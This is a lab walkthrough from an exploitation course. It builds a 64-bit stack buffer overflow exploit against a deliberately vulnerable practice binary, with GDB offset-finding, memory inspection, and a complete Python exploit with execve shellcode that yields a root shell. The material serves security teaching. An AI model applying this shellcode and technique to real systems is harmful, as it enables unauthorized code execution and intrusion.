# Development of a buffer overflow exploit - 64 bit

## Introduction

We will create a functional exploit for a 64 bit program with a stack overflow vulnerability. This includes
finding the vulnerability, get all necessary information for our exploit, and create a sample exploit as
python program.


## Goal

* Implement a fully working exploit for x64 bit architecture with GDB and simple tools
* Write the same exploit again, but with pwntools

The following exploits are available: 
* [challenge12-exploit-skel.py](https://github.com/dobin/yookiterm-challenges-files/blob/master/challenge12/challenge12-exploit-skel.py): a prepared exploit, missing offset and address
* [challenge12-exploit-gdb.py](https://github.com/dobin/yookiterm-challenges-files/blob/master/challenge12/challenge12-exploit-gdb.py): skel with data used in this writeup. Which may work
*  [challenge12-exploit-pwn.py](https://github.com/dobin/yookiterm-challenges-files/blob/master/challenge12/challenge12-exploit-pwn.py): pwntools exploit


## Challenge Source

This is the same as challenge11, but in 64 bit.

You can compile it by calling `make` in the folder `~/challenges/challenge12`

Analysis:
```
root@hlUbuntu64:~/challenges/challenge12# file challenge12
challenge12: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9397ca5655aeb327386bb0d572717f9906978301, not stripped
```


## Vulnerability

Source: [challenge12.c](https://github.com/dobin/yookiterm-challenges-files/blob/master/challenge12/challenge12.c)

Reminder: the vulnerability lies here:

```c
void handleData(char *username, char *password) {
	...
	char firstname[64];
	...
	strcpy(firstname, username);
	...
}

int main(int argc, char **argv) {
	...
	handleData(argv[1], argv[2]);
}
```

The first command line argument of the program is copied into a stack buffer of 64 byte size.


## Find offset

You can crash the program by giving longer and longer strings as first argument.

Depending on the amount of overflow, one of these conditions can appear:
- Not enough overflow: Program exits cleanly, `isAdmin` is 0x0
- Nearly enough overflow: Program exists cleanly, `isAdmin` is overflowed (has 0x41's)
- Overflow into SBP: Program crashes, but with `RIP` = 0x400833 or similar (no 0x41's)
- Overflow into SIP: Program crashes, with `RIP` = 0x0000004141 (what we want)
- Overflow too far into `SIP`: Program crashes, with `RIP` = 0x4007d3 or similar (again no 0x41's)

### Nearly enough overflow

Offset: 70

```
(gdb) run `python -c 'print "A" * 70 + "BBBB"'` test
You are admin!
isAdmin: 0x4242
[Inferior 1 (process 504) exited normally]
```

### Overflow into SBP

Offset: 78

```
(gdb) run `python -c 'print "A" * 78 + "BBBB"'` test
You are admin!
isAdmin: 0x42424141

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400832 in main ()
```

### Overflow into SIP

Offset: 86

```
(gdb) run `python -c 'print "A" * 86 + "BBBB"'` test
You are admin!
isAdmin: 0x41414141

Program received signal SIGSEGV, Segmentation fault.
0x0000000000004242 in ?? ()
```

Offset: 88
```
(gdb) run `python -c 'print "A" * 88 + "BBBB"'` test
You are admin!
isAdmin: 0x41414141

Program received signal SIGSEGV, Segmentation fault.
0x0000000042424242 in ?? ()
```

`0x0000000042424242` is exactly "BBBB" - no byte too much or too little.
Therefore, offset is 88 bytes.


### Overflow too far into SIP

Offset: 92

```
(gdb) run `python -c 'print "A" * 92 + "BBBB"'` test
You are admin!
isAdmin: 0x41414141

Program received signal SIGSEGV, Segmentation fault.
0x00000000004007d3 in handleData ()
```

We have completely overwritten SIP here, all 64 bits. This is not a valid address, therefore
RIP is now `0x00000000004007d3`. Very confusing.


## Find buffer base address

We want to identify the buffer address of the variable `name` in the function `handleData()`,
as there will be our shellcode be located.

For this, we set a breakpoint exactly before `strcpy(name, username)` gets executed.
The register RDI contains the first parameter for `strcpy()`, and therefore points
to our variable / buffer / shellcode.

We take care to be as realistic as possible, and give a input buffer of the same size
as the actual exploit: offset 84 + 8 byte SIP.


Disassemble the main function:
```
gdb-peda$ disas handleData
Dump of assembler code for function handleData:
...
   0x00000000004007db <+60>:    mov    rdx,QWORD PTR [rbp-0x58]
   0x00000000004007df <+64>:    lea    rax,[rbp-0x50]
   0x00000000004007e3 <+68>:    mov    rsi,rdx
   0x00000000004007e6 <+71>:    mov    rdi,rax
=> 0x00000000004007e9 <+74>:    call   0x4005e0 <strcpy@plt>
...
```

Lets break before calling `strcpy()`:
```
gdb-peda$ b *handleData+74
Breakpoint 1 at 0x400783
```

And run it with some dummy data:

```
gdb-peda$ run `python -c 'print "A" * 88 + "BBBB"'` test
Starting program: /root/challenges/challenge12/challenge12 AAAAAAAA BBBBBBBB

Breakpoint 1, 0x0000000000400828 in main ()
```

Lets check the buffer where `strcpy()` copies the argument. It is in RDI.

```
gdb-peda$ i r rdi
rdi            0x7fffffffe560   0x7fffffffe560
gdb-peda$ x/32x $rdi
0x7fffffffe560: 0x58    0x58    0x58    0x58    0x58    0x58    0x58   0x58
0x7fffffffe568: 0x58    0x58    0x58    0x58    0x58    0x58    0x58   0x58
0x7fffffffe570: 0x58    0x58    0x58    0x58    0x58    0x58    0x58   0x58
0x7fffffffe578: 0x58    0x58    0x58    0x58    0x58    0x58    0x58   0x58
```

Therefore, the start of the buffer, where our future shellcode will be, is `0x7fffffffe560`.


## Create an exploit

The prepared exploit skeleton is available at the file `challenge12-exploit-skel.py`.
Lets insert the correct values:

```python
#!/usr/bin/python
# Skeleton exploit for challenge12
import sys
import struct

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

buf_size = 64

offset = 88 # Offset we found
ret_addr = struct.pack('<Q', 0x7fffffffe560) # Memory address we found

# fill up to 64 bytes
exploit = "\x90" * (buf_size - len(shellcode))
exploit += shellcode

# garbage between buffer and RET
exploit += "A" * (offset - len(exploit))

# add ret
exploit += ret_addr

# print to stdout
sys.stdout.write(exploit)
```

And try it:

```sh
(gdb) run `python ./challenge12-exploit-gdb.py` bbbb
Starting program: /root/challenges/challenge12/challenge12 `python ./challenge12-exploit-gdb.py` bbbb
You are admin!
isAdmin: 0x41414141
process 364 is executing new program: /bin/dash
# id
uid=0(root) gid=0(root) groups=0(root)
```

We see that "/bin/dash" is being executed, and a shell prompt "#" is displayed. This means
that our exploit works!


## Questions

* Can you adjust the exploit so it works without GDB?
* Can you create an exploit which works in both, with and without GDB?
